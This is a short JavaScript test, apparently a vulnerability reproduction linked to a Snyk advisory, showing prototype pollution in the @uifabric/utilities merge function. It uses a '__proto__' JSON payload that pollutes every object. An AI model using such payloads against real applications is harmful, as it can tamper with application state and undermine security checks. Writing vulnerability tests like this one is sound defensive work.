//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
test("prototype pollution in @uifabric/utilities ", () => {
  var util = require("@uifabric/utilities");
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  var source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  y = util.merge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
